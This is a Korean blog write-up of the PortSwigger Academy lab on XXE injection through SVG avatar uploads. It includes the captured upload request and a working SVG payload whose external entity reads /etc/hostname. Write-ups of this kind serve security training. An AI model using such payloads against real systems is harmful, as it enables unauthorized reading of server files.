---
layout: post
title: "Burp Academy-XXE 취약점: Exploiting XXE via image file upload"
categories: [보안취약점, Burp Academy]
tags: [보안취약점, Burp Academy, XXE injection]
toc: true
last_modified_at: 2024-08-16 21:00:00 +0900
---

# 개요
- 문제 주소: https://portswigger.net/web-security/xxe/lab-xxe-via-file-upload
- 취약점 설명: https://portswigger.net/web-security/xxe#finding-hidden-attack-surface-for-xxe-injection
- 난이도: PRACTITIONER (중간)


# 취약점 설명: XXE attacks via file upload
일부 애플리케이션은 유저가 파일을 업로드한 다음 서버 측에서 처리하도록 허용한다. 일부 파일 형식은 XML을 사용하거나 XML 하위 구성 요소를 포함한다. XML 기반 형식의 예로는 DOCX와 같은 오피스 문서 형식과 SVG와 같은 이미지 형식이 있다.

예를 들어, 애플리케이션은 유저가 이미지를 업로드하고 업로드한 후 서버에서 이를 처리하거나 검증하도록 허용할 수 있다. 애플리케이션이 PNG 또는 JPEG와 같은 형식을 처리할 것으로 예상하더라도, 이미지 처리 라이브러리는 SVG 이미지를 지원할 수 있다. SVG 형식은 XML을 사용하므로 공격자는 악성 SVG 이미지를 제출하여 XXE 취약성에 대한 숨겨진 공격 표면에 도달할 수 있다. 

# 랩 개요
- 이 랩에서는 커멘트를 남길 때 유저가 아바타를 붙일 수 있게 하고 있다. 이 기능은 Apache의 Batik 이미지 처리 라이브러리를 사용한다. 
- 문제를 풀려면 /etc/hostname의 내용을 출력하는 내용을 가진 이미지를 서버에 업로드한다. 
- 알아낸 /etc/hostname의 내용을  "Submit solution" 기능을 사용해서 서버에 제출하면 문제가 풀린다. 
- 힌트: SVG 이미지 포맷은 XML을 사용한다. 

```
This lab lets users attach avatars to comments and uses the Apache Batik library to process avatar image files.

To solve the lab, upload an image that displays the contents of the /etc/hostname file after processing. Then use the "Submit solution" button to submit the value of the server hostname.

Hint
The SVG image format uses XML.
```

# 도전 

## 살펴보기 
1. 댓글을 저장하는 기능의 엔드포인트는 `POST /post/comment`다. 

2. 첨부이미지의 사이즈 제한이 있다. 10kb 정도도 너무 크다고 한다. 그림판으로 작은 png파일(972바이트)를 만들어서 올려봤더니 올라간다. 

![](/images/burp-academy-xxe-8-1.png)

## 공격 페이로드 만들기

3. SVG 파일을 만들 수 있어야 한다. (SVG 파일에 공격코드를 심을 수 있어야 한다) 

일단 그림판에는 SVG파일을 저장할 수 있는 기능이 없다. 

4. 온라인에서 png파일을 SVG파일로 만들어주는 사이트가 있다. [onlineconvertfree.com](https://onlineconvertfree.com/convert-format/png-to-svg/
)를 사용해보자. 


![](/images/burp-academy-xxe-8-2.png)

svg 파일을 다운로드 받을 수 있었다. 

5. svg 파일을 텍스트 편집기로 열어본다. 다음과 같이 생겼다. 
- `<!DOCTYPE>`이 보인다. XML을 추가할 수 있어 보인다. 이미지의 내용은 svg 태그에 있는 것으로 보인다. 

```xml
<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" id="Layer_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="107px" height="77px" viewBox="0 0 107 77" enable-background="new 0 0 107 77" xml:space="preserve">  <image id="image0" width="107" height="77" x="0" y="0"
    href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGsAAABNCAAAAACEIcX7AAAABGdBTUEAALGPC/xhBQAAACBjSFJN
AAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAAAAmJLR0QA/4ePzL8AAAAJcEhZ
cwAADsMAAA7DAcdvqGQAAAAHdElNRQfoCBAAJgcLEDmWAAACIElEQVRo3u2XMXaDMBBEx6lUJh0l
voGPkJLSJSVdSMcNlI4jkM65gUtyIx9B7jYFFhikFZLBfn552s4Y798ZYTHaEB5WL49DRVZkRVZk
RdYTsn63m+33WjBy1SEFAKQHWqNcrDbVA4k7szSpKABIt/S0WcRqXwEgV0RU8bCDlu5DY1kJAJRE
RKQybs3k1cLz0udYsidpmDBgnahckSq8YAyrAZAPH1VhgUkAyNQwzRzMzjqJvsulauNpbPr19IXZ
WRWwU+NLNYCRsGQ8jgfMyjoJ4Di9KMbCJIDROCoDUAezSmBnXBwLmyyohjn/9DaWhEXWRFgyXVAi
UlOb51kSQGa5tb7aPZupg/00DpjJamAZWbfS65EYDuppHC6arIRDUdV3aq2yLA+rm9UwbYhICW1i
yr2MhEuY8ZPU6o4eu+znL5k7HM+9wZLYK7q9Kocw04rTAlLnMycMQZ2WCdusfV4+v53B9Fw9swmJ
kvlqdV2OeqYs+g9Zv9vtz7ow/p+SAsIrY/qWQ9cHcP78eowuqgGgXLZnXZdzj+oyaO3u0L4f1mCR
2gNzSSzxPsXM7b3H3RwM8N2/Z++by5jNiqzLKaXiHpHE8R4PZnUw9oQFNp7cwroceexOBljo+14+
7hhtARb6ZwC7kzLAwoC8oZ0ceJdzpXeHoGwz4IbK/BNeYI4yaHlAmLwhsw28EBDdIbM56kkyQGRF
VmRFVmRF1tOy/gCWBPR5Tmpe7AAAACV0RVh0ZGF0ZTpjcmVhdGUAMjAyNC0wOC0xNlQwMDozODow
NyswMDowMMI5UqsAAAAldEVYdGRhdGU6bW9kaWZ5ADIwMjQtMDgtMTZUMDA6Mzg6MDcrMDA6MDCz
ZOoXAAAAAElFTkSuQmCC" />
</svg>

```

6. svg 파일을 업로드할 때의 요청을 캡쳐해서 repeater로 보낸다. 다음과 같이 생겼다. 

```http
POST /post/comment HTTP/2
Host: 0aba00770403d36b84abd22a00a60028.web-security-academy.net
Cookie: session=GLCbIGBbd2ndy6mkCCNlK6iwFnenjqwP
Content-Length: 2380
Cache-Control: max-age=0
Sec-Ch-Ua: "Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
Origin: https://0aba00770403d36b84abd22a00a60028.web-security-academy.net
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryKrAtIy6HHykIFo3u
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0aba00770403d36b84abd22a00a60028.web-security-academy.net/post?postId=2
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9,ja;q=0.8,ko;q=0.7
Priority: u=0, i

------WebKitFormBoundaryKrAtIy6HHykIFo3u
Content-Disposition: form-data; name="csrf"

vE3KFjCVjpR5undYXbdjcImjJ6JI3Khk
------WebKitFormBoundaryKrAtIy6HHykIFo3u
Content-Disposition: form-data; name="postId"

2
------WebKitFormBoundaryKrAtIy6HHykIFo3u
Content-Disposition: form-data; name="comment"

Yes!
------WebKitFormBoundaryKrAtIy6HHykIFo3u
Content-Disposition: form-data; name="name"

moon
------WebKitFormBoundaryKrAtIy6HHykIFo3u
Content-Disposition: form-data; name="avatar"; filename="smile2.svg"
Content-Type: image/svg+xml

<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" id="Layer_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="107px" height="77px" viewBox="0 0 107 77" enable-background="new 0 0 107 77" xml:space="preserve">  <image id="image0" width="107" height="77" x="0" y="0"
    href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGsAAABNCAAAAACEIcX7AAAABGdBTUEAALGPC/xhBQAAACBjSFJN
AAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAAAAmJLR0QA/4ePzL8AAAAJcEhZ
cwAADsMAAA7DAcdvqGQAAAAHdElNRQfoCBAAJgcLEDmWAAACIElEQVRo3u2XMXaDMBBEx6lUJh0l
voGPkJLSJSVdSMcNlI4jkM65gUtyIx9B7jYFFhikFZLBfn552s4Y798ZYTHaEB5WL49DRVZkRVZk
RdYTsn63m+33WjBy1SEFAKQHWqNcrDbVA4k7szSpKABIt/S0WcRqXwEgV0RU8bCDlu5DY1kJAJRE
RKQybs3k1cLz0udYsidpmDBgnahckSq8YAyrAZAPH1VhgUkAyNQwzRzMzjqJvsulauNpbPr19IXZ
WRWwU+NLNYCRsGQ8jgfMyjoJ4Di9KMbCJIDROCoDUAezSmBnXBwLmyyohjn/9DaWhEXWRFgyXVAi
UlOb51kSQGa5tb7aPZupg/00DpjJamAZWbfS65EYDuppHC6arIRDUdV3aq2yLA+rm9UwbYhICW1i
yr2MhEuY8ZPU6o4eu+znL5k7HM+9wZLYK7q9Kocw04rTAlLnMycMQZ2WCdusfV4+v53B9Fw9swmJ
kvlqdV2OeqYs+g9Zv9vtz7ow/p+SAsIrY/qWQ9cHcP78eowuqgGgXLZnXZdzj+oyaO3u0L4f1mCR
2gNzSSzxPsXM7b3H3RwM8N2/Z++by5jNiqzLKaXiHpHE8R4PZnUw9oQFNp7cwroceexOBljo+14+
7hhtARb6ZwC7kzLAwoC8oZ0ceJdzpXeHoGwz4IbK/BNeYI4yaHlAmLwhsw28EBDdIbM56kkyQGRF
VmRFVmRF1tOy/gCWBPR5Tmpe7AAAACV0RVh0ZGF0ZTpjcmVhdGUAMjAyNC0wOC0xNlQwMDozODow
NyswMDowMMI5UqsAAAAldEVYdGRhdGU6bW9kaWZ5ADIwMjQtMDgtMTZUMDA6Mzg6MDcrMDA6MDCz
ZOoXAAAAAElFTkSuQmCC" />
</svg>

------WebKitFormBoundaryKrAtIy6HHykIFo3u
Content-Disposition: form-data; name="email"

ee@test.com
------WebKitFormBoundaryKrAtIy6HHykIFo3u
Content-Disposition: form-data; name="website"


------WebKitFormBoundaryKrAtIy6HHykIFo3u--

```

7. SVG안에 XXE공격 페이로드를 심는다. /etc/hotname의 값을 보는 페이로드를 사용한다. 

```xml
<!DOCTYPE test [<!ENTITY foo SYSTEM "file:///etc/hostname"> ]>
<stockCheck>
    <productId>&foo;</productId>
    <storeId>1</storeId>
</stockCheck>
```

8. 이 것을 SVG 파일의 상단에 추가해서 요청을 보내본다. 

![](/images/burp-academy-xxe-8-3.png)

9. 500 에러가 발생했다. 음.. 

![](/images/burp-academy-xxe-8-4.png)

10. 어쩌면 SVG를 사용해서 XXE 인젝션 공격을 하는 페이로드가 인터넷에 공개되어 있는지도 모른다. 찾아보이 [여기](https://gist.github.com/jakekarnes42/b879f913fd3ae071c11199b9bd7ba3a7?short_path=f3432ae)에 딱 공개되어 있었다. 

외부참조를 통해 조회한 파일의 내용을 Text로 표시해주는 SVG파일의 코드다. 

```xml
 <?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg> 
```

11. 위의 코드를 댓글적을 때의 이미지 부분에 지정해서 요청을 보내본다. 302 정상처리 응답이 돌아온다. 

![](/images/burp-academy-xxe-8-5.png)

12. 작성된 댓글을 보면 조그맣게 이미지가 보이는 것을 알 수 있다.  

![](/images/burp-academy-xxe-8-7.png)

13. 해당 이미지 파일을 브라우저에서 새 탭으로 보기(Open image in new tab)를 선택하면 다음과 같이 크게 보인다. /etc/hostname의 정보가 이미지로 출력된 것이다! 

![](/images/burp-academy-xxe-8-6.png)

14. 이 값을 제출하면 문제가 풀렸다는 메세지가 표시된다. 

![](/images/burp-academy-xxe-8-success.png)